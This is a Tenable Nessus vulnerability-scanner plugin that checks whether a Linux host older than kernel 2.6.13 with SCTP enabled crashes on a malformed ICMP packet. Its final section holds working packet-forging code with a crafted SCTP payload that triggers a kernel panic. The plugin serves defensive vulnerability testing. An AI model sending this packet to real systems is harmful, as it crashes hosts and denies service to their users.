#
# (C) Tenable Network Security, Inc.
#

# Credits: Charles-Henri de Boysson
#
# Fixed in 2.6.13 vanilla kernel

include("compat.inc");

if (description)
{
 script_id(19777);
 script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2014/05/26 00:51:57 $");

 script_osvdb_id(55185);

 script_name(english:"Linux SCTP ICMP Packet Handling Null Dereference Remote DoS");
 script_summary(english:"Kills the remote Linux with a bad ICMP packet");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote host by sending it malformed ICMP
packets.");
 script_set_attribute(attribute:"description", value:
"Linux kernels older than version 2.6.13 contain a bug that may allow
an attacker to cause a NULL pointer dereference by sending malformed
ICMP packets, thus resulting in a kernel panic.

This flaw is present only if SCTP support is enabled on the remote
host.

An attacker can use this to make this host crash continuously, thus
preventing legitimate users from using it.");
 script_set_attribute(attribute:"see_also", value:"http://oss.sgi.com/projects/netdev/archive/2005-07/msg00140.html");
 script_set_attribute(attribute:"solution", value:"Ugprade to Linux 2.6.13 or newer, or disable SCTP support.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");

 script_set_attribute(attribute:"plugin_publication_date", value:"2005/09/23");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/o:linux:kernel");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);
if ( TARGET_IS_IPV6 ) exit(0);
start_denial();

src = this_host();
dst = get_host_ip();
id = rand();

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0xC0, ip_off: 0,
                        ip_p:IPPROTO_ICMP, ip_id: id, ip_ttl:0x40,
	     	        ip_src:this_host());
ip2 = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
                        ip_p: 132, ip_id: id+1, ip_ttl:0x40,
	     	        ip_src:this_host(),
			data: '\x28\x00\x00\x50\x00\x00\x00\x00\xf9\x57\x1F\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00');
icmp = forge_icmp_packet(ip:ip, icmp_type: 3, icmp_code:2,
	     		  icmp_seq: 0, icmp_id:0, data: ip2);
send_packet(icmp, pcap_active: 0);

alive = end_denial();
if(!alive)
{
 security_hole();
 set_kb_item(name:"Host/dead", value:TRUE);
}

